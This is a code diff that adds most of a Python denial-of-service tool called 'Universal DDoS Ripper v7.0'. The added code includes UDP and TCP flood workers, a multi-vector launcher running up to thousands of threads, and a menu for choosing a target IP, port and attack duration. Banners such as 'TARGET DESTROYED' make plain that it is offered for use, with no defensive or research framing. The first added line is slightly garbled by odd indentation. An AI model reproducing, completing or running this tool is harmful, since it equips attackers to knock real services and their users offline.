@@ -530,4 +530,390 @@ class UniversalAttackEngine:
             while time.time() < end_time and self.attack_active:
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.s
+                                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
+                    
+                    # Platform-optimized packet size
+                    if self.platform.is_mobile:
+                        max_size = 512
+                        packets_per_iter = 5
+                    else:
+                        max_size = 1024
+                        packets_per_iter = 20
+                    
+                    for _ in range(packets_per_iter):
+                        size = random.randint(64, max_size)
+                        payload = os.urandom(size)
+                        
+                        # Target multiple ports
+                        target_port = random.choice([
+                            self.port, 80, 443, 53, 8080, 8443
+                        ])
+                        
+                        sock.sendto(payload, (self.target, target_port))
+                        self.stats['total_packets'] += 1
+                    
+                    sock.close()
+                except:
+                    pass
+        
+        # Start thread pool
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(udp_worker, i) for i in range(threads)]
+            
+            # Monitor
+            start_time = time.time()
+            while time.time() < start_time + duration:
+                elapsed = time.time() - start_time
+                pps = self.stats['total_packets'] / elapsed if elapsed > 0 else 0
+                print(f"{COLOR.GREEN}🚀 Universal PPS: {pps:.0f} | Total: {self.stats['total_packets']:,}{COLOR.END}")
+                time.sleep(2)
+            
+            print(f"{COLOR.GREEN}🎯 UDP Complete: {self.stats['total_packets']:,} packets{COLOR.END}")
+    
+    def universal_tcp_flood(self, duration=300, threads=None):
+        """Universal TCP flood for all platforms"""
+        if threads is None:
+            threads = self.max_threads // 3
+        
+        threads = min(threads, self.max_threads)
+        print(f"{COLOR.RED}[TCP] Starting Universal TCP Flood with {threads} threads{COLOR.END}")
+        
+        def tcp_worker(worker_id):
+            end_time = time.time() + duration
+            
+            while time.time() < end_time and self.attack_active:
+                try:
+                    sockets = []
+                    # Create multiple sockets per iteration
+                    for _ in range(3 if self.platform.is_mobile else 8):
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(2)
+                        
+                        try:
+                            s.connect((self.target, self.port))
+                            sockets.append(s)
+                            
+                            # Send various payloads
+                            payloads = [
+                                b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n",
+                                b"POST / HTTP/1.1\r\nContent-Length: 100\r\n\r\n" + os.urandom(100),
+                                b"A" * 512,
+                            ]
+                            
+                            payload = random.choice(payloads)
+                            s.send(payload)
+                            self.stats['total_packets'] += 1
+                            
+                        except:
+                            pass
+                    
+                    # Close sockets
+                    for s in sockets:
+                        try:
+                            s.close()
+                        except:
+                            pass
+                            
+                except:
+                    pass
+        
+        # Start thread pool
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(tcp_worker, i) for i in range(threads)]
+            
+            # Monitor
+            start_time = time.time()
+            while time.time() < start_time + duration:
+                elapsed = time.time() - start_time
+                print(f"{COLOR.GREEN}🔗 TCP Active: {threads} threads | Total: {self.stats['total_packets']:,}{COLOR.END}")
+                time.sleep(2)
+    
+    def launch_universal_assault(self, duration=600):
+        """Launch universal assault optimized for current platform"""
+        print(f"{COLOR.RED}{COLOR.BLINK}")
+        print("╔══════════════════════════════════════════════════════════════╗")
+        print("║                 🌐 UNIVERSAL ASSAULT 🌐                    ║")
+        print("║              OPTIMIZED FOR ALL PLATFORMS                   ║")
+        print("╚══════════════════════════════════════════════════════════════╝")
+        print(f"{COLOR.END}")
+        
+        self.platform.optimize_for_platform()
+        
+        print(f"{COLOR.RED}🎯 TARGET: {self.target}:{self.port}{COLOR.END}")
+        print(f"{COLOR.RED}⏰ DURATION: {duration} seconds{COLOR.END}")
+        print(f"{COLOR.RED}📱 PLATFORM: {self.platform.system.upper()} | MOBILE: {self.platform.is_mobile}{COLOR.END}")
+        print(f"{COLOR.RED}💀 WEAPONS: HTTP + UDP + TCP{COLOR.END}")
+        
+        # Countdown
+        for i in range(5, 0, -1):
+            print(f"{COLOR.RED}{COLOR.BLINK}💀 ASSAULT IN {i}...{COLOR.END}")
+            time.sleep(1)
+        
+        # Platform-specific configuration
+        if self.platform.is_mobile:
+            # Mobile-optimized settings
+            http_workers = 200
+            udp_threads = 100
+            tcp_threads = 80
+        else:
+            # Desktop-optimized settings
+            http_workers = 2000
+            udp_threads = 800
+            tcp_threads = 600
+        
+        # Launch attacks
+        attack_threads = []
+        
+        attacks = [
+            ('HTTP FLOOD', lambda: self.universal_http_flood(duration, http_workers)),
+            ('UDP FLOOD', lambda: self.universal_udp_flood(duration, udp_threads)),
+            ('TCP FLOOD', lambda: self.universal_tcp_flood(duration, tcp_threads)),
+        ]
+        
+        for attack_name, attack_func in attacks:
+            t = threading.Thread(target=attack_func, name=attack_name)
+            t.daemon = True
+            t.start()
+            attack_threads.append(t)
+            print(f"{COLOR.GREEN}[+] {attack_name} DEPLOYED{COLOR.END}")
+        
+        # Global monitoring
+        start_time = time.time()
+        def global_monitor():
+            while time.time() < start_time + duration and self.attack_active:
+                elapsed = time.time() - start_time
+                remaining = duration - elapsed
+                total_attack = self.stats['total_packets'] + self.stats['total_requests']
+                
+                print(f"{COLOR.CYAN}{COLOR.BOLD}")
+                print("╔══════════════════════════════════════════════════════════════╗")
+                print(f"║                 🌐 UNIVERSAL ASSAULT ACTIVE 🌐           ║")
+                print(f"║                 Time Remaining: {remaining:6.1f}s                 ║")
+                print(f"║                 Total Attacks: {total_attack:>12,}         ║")
+                print(f"║                 Platform: {self.platform.system:>10}         ║")
+                print("╚══════════════════════════════════════════════════════════════╝")
+                print(f"{COLOR.END}")
+                
+                time.sleep(5)
+        
+        monitor_thread = threading.Thread(target=global_monitor, daemon=True)
+        monitor_thread.start()
+        
+        # Wait for completion
+        for t in attack_threads:
+            t.join(timeout=duration + 10)
+        
+        self.attack_active = False
+        
+        # Final report
+        total_damage = self.stats['total_packets'] + self.stats['total_requests']
+        print(f"{COLOR.RED}{COLOR.BLINK}")
+        print("╔══════════════════════════════════════════════════════════════╗")
+        print("║                    💀 MISSION ACCOMPLISHED 💀               ║")
+        print(f"║               TOTAL DAMAGE: {total_damage:>12,}            ║")
+        print(f"║               PLATFORM: {self.platform.system.upper():>11}           ║")
+        print("║                  TARGET DESTROYED                          ║")
+        print("╚══════════════════════════════════════════════════════════════╝")
+        print(f"{COLOR.END}")
+
+# =============================================================================
+# UNIVERSAL COMMAND INTERFACE
+# =============================================================================
+class UniversalInterface:
+    def __init__(self):
+        self.target = ""
+        self.port = 80
+        self.duration = 600
+        self.platform = CrossPlatform()
+        self.dependency_manager = DependencyManager()
+        
+    def show_banner(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"{COLOR.RED}{COLOR.BLINK}")
+        print(r"""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║ ███╗░░██╗██╗░██████╗░██╗░░██╗████████╗███╗░░░███╗░█████╗░██████╗░████████╗ ║
+║ ████╗░██║██║██╔════╝░██║░░██║╚══██╔══╝████╗░████║██╔══██╗██╔══██╗╚══██╔══╝ ║
+║ ██╔██╗██║██║██║░░██╗░███████║░░░██║░░░██╔████╔██║███████║██████╔╝░░░██║░░░ ║
+║ ██║╚████║██║██║░░╚██╗██╔══██║░░░██║░░░██║╚██╔╝██║██╔══██║██╔══██╗░░░██║░░░ ║
+║ ██║░╚███║██║╚██████╔╝██║░░██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░░██║░░░██║░░░ ║
+║ ╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░ ║
+║                                                                              ║
+║           🌐 UNIVERSAL DDoS RIPPER v7.0 🌐                                ║
+║           CROSS-PLATFORM: Termux, Windows, Linux, macOS                    ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+        """)
+        print(f"{COLOR.END}")
+        
+        # Show platform info
+        print(f"{COLOR.CYAN}⚡ Platform: {self.platform.system.upper()} | Mobile: {self.platform.is_mobile} | Root: {self.platform.is_root}{COLOR.END}")
+        print(f"{COLOR.CYAN}⚡ Architecture: {self.platform.arch} | CPUs: {cpu_count()}{COLOR.END}")
+        print()
+    
+    def show_menu(self):
+        self.show_banner()
+        print(f"{COLOR.RED}{COLOR.BLINK}💀 UNIVERSAL COMMAND CENTER 💀{COLOR.END}")
+        print(f"{COLOR.WHITE}Cross-platform destruction interface:{COLOR.END}\n")
+        
+        print(f"{COLOR.CYAN}⚡ TARGET LOCK:{COLOR.END}")
+        print(f"  {COLOR.WHITE}🎯 Target:{COLOR.END} {COLOR.RED}{self.target if self.target else 'NOT SET'}{COLOR.END}")
+        print(f"  {COLOR.WHITE}🔌 Port:{COLOR.END} {COLOR.RED}{self.port}{COLOR.END}")
+        print(f"  {COLOR.WHITE}⏰ Duration:{COLOR.END} {COLOR.RED}{self.duration} seconds{COLOR.END}")
+        
+        print(f"\n{COLOR.PURPLE}💀 UNIVERSAL ATTACK OPTIONS:{COLOR.END}")
+        
+        if self.platform.is_mobile:
+            print(f"  {COLOR.GREEN}[1]{COLOR.END} 📱 Mobile-Optimized Assault")
+            print(f"  {COLOR.GREEN}[2]{COLOR.END} 🌐 Universal Multi-Vector Attack")
+            print(f"  {COLOR.GREEN}[3]{COLOR.END} 🔧 Platform Optimization")
+        else:
+            print(f"  {COLOR.GREEN}[1]{COLOR.END} 🌐 Universal Multi-Vector Attack")
+            print(f"  {COLOR.GREEN}[2]{COLOR.END} 📱 Mobile-Compatible Mode")
+            print(f"  {COLOR.GREEN}[3]{COLOR.END} 🔧 Platform Optimization")
+        
+        print(f"  {COLOR.GREEN}[4]{COLOR.END} 🎯 Set Target")
+        print(f"  {COLOR.GREEN}[5]{COLOR.END} 🔌 Set Port")
+        print(f"  {COLOR.GREEN}[6]{COLOR.END} ⏰ Set Duration")
+        print(f"  {COLOR.GREEN}[7]{COLOR.END} 📦 Check Dependencies")
+        print(f"  {COLOR.GREEN}[8]{COLOR.END} 💥 Quick Attack (2 min)")
+        print(f"  {COLOR.GREEN}[9]{COLOR.END} ☠️  Extended Attack (10 min)")
+        print(f"  {COLOR.RED}[0]{COLOR.END} ❌ Exit")
+    
+    def run(self):
+        """Main interface loop"""
+        # Check dependencies first
+        self.dependency_manager.check_dependencies()
+        
+        input(f"\n{COLOR.YELLOW}Press Enter to continue to main menu...{COLOR.END}")
+        
+        while True:
+            self.show_menu()
+            choice = input(f"\n{COLOR.YELLOW}💀 Select option: {COLOR.END}")
+            self.handle_choice(choice)
+    
+    def handle_choice(self, choice):
+        if choice == '1':
+            if self.platform.is_mobile:
+                self.mobile_assault()
+            else:
+                self.universal_assault()
+        elif choice == '2':
+            if self.platform.is_mobile:
+                self.universal_assault()
+            else:
+                self.mobile_assault()
+        elif choice == '3':
+            self.platform_optimization()
+        elif choice == '4':
+            self.set_target()
+        elif choice == '5':
+            self.set_port()
+        elif choice == '6':
+            self.set_duration()
+        elif choice == '7':
+            self.check_dependencies()
+        elif choice == '8':
+            self.quick_attack()
+        elif choice == '9':
+            self.extended_attack()
+        elif choice == '0':
+            print(f"{COLOR.RED}Exiting Universal DDoS Ripper...{COLOR.END}")
+            sys.exit(0)
+        else:
+            print(f"{COLOR.RED}Invalid option!{COLOR.END}")
+            input("Press Enter to continue...")
+    
+    def set_target(self):
+        self.target = input(f"{COLOR.YELLOW}Enter target IP/domain: {COLOR.END}").strip()
+    
+    def set_port(self):
+        try:
+            self.port = int(input(f"{COLOR.YELLOW}Enter target port: {COLOR.END}"))
+        except ValueError:
+            print(f"{COLOR.RED}Invalid port!{COLOR.END}")
+    
+    def set_duration(self):
+        try:
+            self.duration = int(input(f"{COLOR.YELLOW}Enter attack duration (seconds): {COLOR.END}"))
+        except ValueError:
+            print(f"{COLOR.RED}Invalid duration!{COLOR.END}")
+    
+    def platform_optimization(self):
+        """Apply platform-specific optimizations"""
+        self.platform.optimize_for_platform()
+        input(f"{COLOR.GREEN}Platform optimizations applied. Press Enter to continue...{COLOR.END}")
+    
+    def check_dependencies(self):
+        """Check and install dependencies"""
+        self.dependency_manager.check_dependencies()
+        input(f"{COLOR.GREEN}Dependency check complete. Press Enter to continue...{COLOR.END}")
+    
+    def mobile_assault(self):
+        """Launch mobile-optimized assault"""
+        if not self.target:
+            print(f"{COLOR.RED}Target not set!{COLOR.END}")
+            return
+        
+        print(f"{COLOR.YELLOW}[*] Preparing mobile-optimized assault...{COLOR.END}")
+        engine = MobileAttackEngine(self.target, self.port)
+        engine.launch_mobile_assault(min(self.duration, 300))  # Max 5 min for mobile
+    
+    def universal_assault(self):
+        """Launch universal multi-vector assault"""
+        if not self.target:
+            print(f"{COLOR.RED}Target not set!{COLOR.END}")
+            return
+        
+        print(f"{COLOR.YELLOW}[*] Preparing universal multi-vector assault...{COLOR.END}")
+        engine = UniversalAttackEngine(self.target, self.port)
+        engine.launch_universal_assault(self.duration)
+    
+    def quick_attack(self):
+        """2-minute quick attack"""
+        self.duration = 120
+        print(f"{COLOR.GREEN}Quick Attack: 2 minutes of targeted destruction{COLOR.END}")
+        if self.platform.is_mobile:
+            self.mobile_assault()
+        else:
+            self.universal_assault()
+    
+    def extended_attack(self):
+        """10-minute extended attack"""
+        self.duration = 600
+        print(f"{COLOR.GREEN}Extended Attack: 10 minutes of sustained assault{COLOR.END}")
+        if self.platform.is_mobile:
+            self.mobile_assault()
+        else:
+            self.universal_assault()
+
+# =============================================================================
+# MAIN EXECUTION - UNIVERSAL ENTRY POINT
+# =============================================================================
+def main():
+    """Universal main execution function"""
+    try:
+        print(f"{COLOR.CYAN}[*] Starting Universal DDoS Ripper v7.0{COLOR.END}")
+        print(f"{COLOR.CYAN}[*] Cross-Platform Edition: Termux, Windows, Linux, macOS{COLOR.END}")
+        
+        # Initialize platform detection
+        platform_info = CrossPlatform()
+        print(f"{COLOR.CYAN}[*] Detected: {platform_info.system.upper()} | Mobile: {platform_info.is_mobile}{COLOR.END}")
+        
+        # Warning for non-root on Linux
+        if platform_info.system == 'linux' and not platform_info.is_root and not platform_info.is_termux:
+            print(f"{COLOR.YELLOW}[!] Running without root privileges - some features may be limited{COLOR.END}")
+            print(f"{COLOR.YELLOW}[!] For full power, run with: sudo python3 {sys.argv[0]}{COLOR.END}")
+        
+        # Start universal interface
+        interface = UniversalInterface()
+        interface.run()
+        
+    except KeyboardInterrupt:
+        print(f"\n{COLOR.RED}Universal assault interrupted{COLOR.END}")
+    except Exception as e:
+        print(f"{COLOR.RED}Fatal error: {e}{COLOR.END}")
+        import traceback
+        traceback.print_exc()
+
+if __name__ == "__main__":
+    main()
